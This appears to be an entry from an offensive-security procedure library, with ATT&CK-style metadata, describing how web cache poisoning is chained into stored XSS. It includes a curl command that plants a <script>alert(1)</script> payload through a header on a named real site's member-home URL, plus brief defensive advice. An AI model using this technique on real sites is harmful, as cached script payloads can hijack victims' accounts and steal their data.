---
tags:
  - stored-xss
  - payload-caching
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/get-member-home-xss]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0eeb377f-0303-4786-a370-cf8a1c44c2bb
created_at: '2025-12-13T09:00:34.762Z'
updated_at: '2025-12-13T09:00:34.762Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Chain to Stored XSS via Payload Caching

## Summary

This procedure chains web cache poisoning to store malicious XSS payloads in cached responses, enabling execution of arbitrary JavaScript in victims' browsers.

## Description

Using URLs with image extensions like .jpeg, attackers cache XSS payloads that persist and execute when victims load the poisoned pages, potentially leading to account compromise or data theft.

## Requirements

1. Access to cache-poisonable endpoints
2. Ability to inject payloads via requests
3. Target with improper cache validation

## Defense

Defensive measures and detection strategies:

- Sanitize and validate cached content
- Use strict cache-control: no-store for dynamic pages
- Detect XSS patterns in cache logs

## Objectives

1. Cache malicious XSS payload
2. Execute stored XSS
3. Achieve code execution in browser context

## Instructions

### Step 1: Inject and Cache XSS Payload

**Context**: Send request to member home URL with timestamp to cache the payload.

**Command** ([[commands/get-member-home-xss]]):

```bash
curl 'https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121' -H 'X-Payload: <script>alert(1)</script>'
```

> This poisons the cache with the XSS payload for stored execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/get-member-home-xss]]

## Tools Used



## Tags

- [[stored-xss]]
- [[payload-caching]]
